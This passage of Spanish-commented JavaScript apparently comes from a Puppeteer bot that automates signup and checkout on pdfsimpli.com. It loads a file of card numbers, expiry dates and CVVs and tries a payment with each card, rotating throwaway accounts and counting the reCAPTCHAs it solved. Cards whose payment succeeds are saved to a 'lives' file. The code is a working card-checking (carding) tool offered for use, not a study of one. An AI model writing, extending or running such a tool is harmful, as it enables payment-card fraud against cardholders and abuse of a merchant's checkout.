                    camposRequeridos.push('fecha');
                    this.log('✅ Fecha de expiración completada', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar fecha', 'ERROR');
                }

                await this.delay(1000);

                // 4. CVV
                this.log('🔐 Completando CVV...');
                if (await this.pagoAuto.buscarYCompletarCVV(tarjeta.cvv)) {
                    camposCompletados++;
                    camposRequeridos.push('cvv');
                    this.log('✅ CVV completado', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar CVV', 'ERROR');
                }

                await this.delay(1000);

                // 5. Términos y condiciones - ¡PASO CRUCIAL ANTES DE PAGAR!
                this.log('✅ Marcando términos y condiciones...');
                if (await this.pagoAuto.marcarTerminos()) {
                    camposCompletados++;
                    camposRequeridos.push('terminos');
                    this.log('✅ Términos aceptados', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo marcar términos y condiciones', 'ERROR');
                }

                this.log(`📊 Campos completados: ${camposCompletados}/5 - ${camposRequeridos.join(', ')}`);

                // Requerir número, fecha, CVV y términos como mínimo
                const exito = camposRequeridos.includes('numero') && 
                              camposRequeridos.includes('cvv') && 
                              camposRequeridos.includes('terminos') &&
                              camposCompletados >= 4;

                if (exito) {
                    this.log('✅ Información de pago completada exitosamente', 'SUCCESS');
                    
                    // ESPERAR UN POCO ANTES DEL PAGO
                    await this.delay(2000);
                    
                    // 6. SOLO AHORA HACER CLIC EN PAGAR
                    this.log('🔄 Procediendo al pago final...');
                    if (await this.hacerClicPago()) {
                        this.log('✅ Proceso de pago iniciado correctamente', 'SUCCESS');
                        return true;
                    } else {
                        this.log('❌ No se pudo iniciar el proceso de pago', 'ERROR');
                        return false;
                    }
                } else {
                    this.log('❌ Información de pago incompleta - no se puede proceder al pago', 'ERROR');
                    return false;
                }

            } catch (error) {
                this.logError(error, 'completarInformacionPago');
                return false;
            }
        }, 'completar información de pago', 2, 3000);
    }

    async hacerClicPago() {
        // Usar PagoAuto para el clic final
        if (this.pagoAuto) {
            this.log('🔄 Usando PagoAuto para continuar al pago...');
            return await this.pagoAuto.clickContinuar();
        } else {
            // Fallback
            const selectores = [
                { tipo: 'id', valor: '#btnChargeebeeSubmit' },
                { tipo: 'texto', valor: 'pay', elemento: 'button, input, div' },
                { tipo: 'texto', valor: 'pagar', elemento: 'button, input, div' },
                { tipo: 'texto', valor: 'submit', elemento: 'button, input, div' },
                { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' }
            ];
            
            return await this.clicInteligente(selectores, 'BOTÓN PAGO', 5000);
        }
    }

    // VERIFICACIÓN DE RESULTADO
    async verificarResultadoPago() {
        try {
            this.log('⏳ Verificando resultado del pago...');
            await this.delay(10000);
            
            const url = await this.page.url();
            const contenido = await this.page.content();
            const contenidoLower = contenido.toLowerCase();
            
            // Verificar por URL
            if (url.includes('confirmation') || url.includes('success') || url.includes('thank')) {
                this.log('✅ ✅ ✅ PAGO EXITOSO detectado por URL', 'SUCCESS');
                return true;
            }
            
            // Verificar por contenido
            const indicadoresExito = [
                'payment successful',
                'pago exitoso',
                'thank you',
                'transaction completed',
                'pago realizado',
                'successful',
                'approved',
                'confirmation'
            ];
            
            for (const indicador of indicadoresExito) {
                if (contenidoLower.includes(indicador.toLowerCase())) {
                    this.log(`✅ ✅ ✅ PAGO EXITOSO detectado: ${indicador}`, 'SUCCESS');
                    return true;
                }
            }
            
            // Verificar errores
            const indicadoresError = [
                'declined',
                'rejected',
                'error',
                'invalid',
                'falló',
                'failed',
                'denied'
            ];
            
            for (const indicador of indicadoresError) {
                if (contenidoLower.includes(indicador)) {
                    this.log(`❌ Pago falló: ${indicador}`, 'ERROR');
                    return false;
                }
            }
            
            this.log('⚠️ No se pudo determinar el resultado del pago, asumiendo fallo', 'WARNING');
            return false;
            
        } catch (error) {
            this.logError(error, 'verificarResultadoPago');
            return false;
        }
    }

    // MÉTODOS AUXILIARES
    generarNombreAleatorio() {
        const nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura"];
        const apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez"];
        return `${nombres[Math.floor(Math.random() * nombres.length)]} ${apellidos[Math.floor(Math.random() * apellidos.length)]}`;
    }

    // FLUJO PRINCIPAL COMPLETO
    async ejecutarFlujoCompleto(tarjeta) {
        try {
            this.log(`\n🎯 INICIANDO FLUJO COMPLETO para tarjeta: ${tarjeta.numero}`);
            
            // Paso 1: Navegar al sitio
            this.log('🌐 Navegando a PDFSimpli...');
            await this.page.goto('https://pdfsimpli.com', { 
                waitUntil: 'networkidle2', 
                timeout: 30000 
            });
            await this.delay(3000);
            
            // Ejecutar pasos en secuencia
            const pasos = [
                { nombre: "Subir PDF", accion: () => this.subirPDF() },
                { nombre: "Convertir PDF", accion: () => this.hacerClicConvert() },
                { nombre: "Iniciar descarga", accion: () => this.hacerClicDownload() },
                { nombre: "Registro de cuenta", accion: () => this.manejarRegistro() },
                { nombre: "Continuar a página de pago", accion: () => this.hacerClicContinuePlan() },
                { nombre: "Completar información de pago", accion: () => this.completarInformacionPago(tarjeta) }
            ];
            
            for (const paso of pasos) {
                this.log(`\n🔄 EJECUTANDO: ${paso.nombre}`);
                const resultado = await paso.accion();
                
                if (resultado === false) {
                    this.log(`❌ FALLÓ: ${paso.nombre}`, 'ERROR');
                    return false;
                }
                
                this.log(`✅ COMPLETADO: ${paso.nombre}`, 'SUCCESS');
                await this.delay(2000);
            }
            
            // Verificar resultado final
            this.log('\n🔍 VERIFICANDO RESULTADO DEL PAGO...');
            return await this.verificarResultadoPago();
            
        } catch (error) {
            this.logError(error, 'ejecutarFlujoCompleto');
            return false;
        }
    }

    // GESTIÓN DE ARCHIVOS
    leerTarjetas() {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) {
                this.log('❌ No existe archivo de tarjetas', 'ERROR');
                return [];
            }

            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetas = [];

            for (const linea of lineas) {
                const limpia = linea.trim();
                if (limpia && !limpia.startsWith('#')) {
                    const partes = limpia.split('|');
                    if (partes.length === 4) {
                        tarjetas.push({
                            numero: partes[0].trim(),
                            mes: partes[1].trim(),
                            anio: partes[2].trim(),
                            cvv: partes[3].trim()
                        });
                    }
                }
            }

            this.log(`✅ ${tarjetas.length} tarjetas cargadas`);
            return tarjetas;
        } catch (error) {
            this.logError(error, 'leerTarjetas');
            return [];
        }
    }

    eliminarTarjetaDelArchivo(tarjeta) {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) return false;
            
            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetaStr = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}`;
            
            const nuevasLineas = lineas.filter(linea => {
                const limpia = linea.trim();
                return !(limpia && !limpia.startsWith('#') && limpia === tarjetaStr);
            });
            
            fs.writeFileSync(this.archivoTarjetas, nuevasLineas.join('\n'), 'utf8');
            this.log(`🗑️ Tarjeta eliminada: ${tarjeta.numero.substring(0, 8)}...`);
            return true;
            
        } catch (error) {
            this.logError(error, 'eliminarTarjetaDelArchivo');
            return false;
        }
    }

    guardarTarjetaValida(tarjeta) {
        try {
            const linea = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}|${new Date().toLocaleString()}\n`;
            fs.appendFileSync(this.archivoLives, linea, 'utf8');
            this.log(`💾 TARJETA VÁLIDA GUARDADA: ${tarjeta.numero}`, 'SUCCESS');
            this.estadisticas.tarjetasValidas++;
            return true;
        } catch (error) {
            this.logError(error, 'guardarTarjetaValida');
            return false;
        }
    }

    // EJECUCIÓN PRINCIPAL
    async ejecutarProcesoCompleto() {
        try {
            const tarjetas = this.leerTarjetas();
            if (tarjetas.length === 0) return;

            this.log(`\n🎯 INICIANDO PROCESO CON ${tarjetas.length} TARJETAS`);
            this.log('🤖 BOT PDF SIMPLI - VERSIÓN MEJORADA CON PAGOAUTO');
            this.log('✅ Registro automático mejorado');
            this.log('🎯 Sistema de reCAPTCHA corregido');
            this.log('💳 NUEVO: Sistema de pago mejorado con PagoAuto');
            this.log('⚡ Tiempos optimizados');
            this.log('🔧 Modo visual activado para debugging');
            
            if (!await this.iniciarNavegador()) return;

            for (let i = 0; i < tarjetas.length; i++) {
                const tarjeta = tarjetas[i];
                this.log(`\n🔰 [${i+1}/${tarjetas.length}] PROCESANDO: ${tarjeta.numero}`);

                this.estadisticas.tarjetasProcesadas++;

                // Obtener cuenta para esta tarjeta
                this.cuentaActual = this.obtenerProximaCuenta();
                if (!this.cuentaActual) {
                    this.log('❌ No hay cuentas disponibles', 'ERROR');
                    break;
                }

                this.log(`👤 Cuenta asignada: ${this.cuentaActual.email.substring(0, 25)}...`);

                // Ejecutar flujo completo
                const exito = await this.ejecutarFlujoCompleto(tarjeta);

                // Procesar resultado
                this.eliminarTarjetaDelArchivo(tarjeta);
                
                if (exito) {
                    this.guardarTarjetaValida(tarjeta);
                    this.log(`\n🎉 ✅ ✅ ✅ TARJETA VÁLIDA ENCONTRADA: ${tarjeta.numero}`, 'SUCCESS');
                    
                    // Marcar cuenta como usada exitosamente
                    this.cuentaActual.usada = true;
                    this.cuentaActual.tarjetasProcesadas++;
                    this.cuentaActual.exitosas++;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                    this.estadisticas.cuentasUsadas++;
                    
                } else {
                    this.log(`\n❌ TARJETA INVÁLIDA: ${tarjeta.numero}`, 'ERROR');
                    
                    // Marcar cuenta como usada con fallo
                    this.cuentaActual.tarjetasProcesadas++;
                    this.cuentaActual.fallidas++;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                }

                this.guardarCuentas();

                // Pausa entre tarjetas
                if (i < tarjetas.length - 1) {
                    this.log('⏳ Esperando 5 segundos para siguiente tarjeta...');
                    await this.delay(5000);
                }
            }

            this.mostrarEstadisticas();

        } catch (error) {
            this.logError(error, 'ejecutarProcesoCompleto');
        } finally {
            if (this.browser) {
                await this.browser.close();
            }
        }
    }

    mostrarEstadisticas() {
        this.log(`\n📊 ========== ESTADÍSTICAS FINALES ==========`, 'SUCCESS');
        this.log(`🎯 Tarjetas procesadas: ${this.estadisticas.tarjetasProcesadas}`, 'SUCCESS');
        this.log(`✅ Tarjetas válidas: ${this.estadisticas.tarjetasValidas}`, 'SUCCESS');
        this.log(`👤 Cuentas usadas: ${this.estadisticas.cuentasUsadas}`, 'SUCCESS');
        this.log(`🛡️  reCAPTCHAs resueltos: ${this.estadisticas.recaptchasResueltos}`, 'SUCCESS');
        this.log(`👨‍💻 reCAPTCHAs manuales: ${this.estadisticas.recaptchasManuales}`, 'SUCCESS');
        this.log(`🔄 Reintentos de clic: ${this.estadisticas.reintentosClic}`, 'SUCCESS');
        this.log(`⏱️ Tiempo total de espera: ${Math.round(this.estadisticas.tiempoEsperaAcumulado/1000)} segundos`, 'SUCCESS');
        this.log(`💾 Tarjetas válidas guardadas en: ${this.archivoLives}`, 'SUCCESS');
    }
}

// EJECUCIÓN PRINCIPAL
(async () => {
    console.log('========================================');
    console.log('🤖 BOT PDF SIMPLI - VERSIÓN MEJORADA');
    console.log('========================================');
    console.log('✅ Registro automático mejorado');
    console.log('🎯 Sistema de reCAPTCHA corregido');
    console.log('💳 NUEVO: Sistema de pago mejorado con PagoAuto');
    console.log('📧 Email y contraseña aleatorios');
    console.log('🔧 Modo visual activado para debugging');
    console.log('⚡ Optimizado para Termux');
    console.log('========================================');
    
    const bot = new BotPDFSimpli();
    await bot.ejecutarProcesoCompleto();
    
    console.log('========================================');
    console.log('✨ FIN DEL PROCESO');
    console.log('✨ Revisa /sdcard/Download/bot_log.txt');
    console.log('✨ Tarjetas válidas en /sdcard/Download/lives.txt');
    console.log('========================================');
})();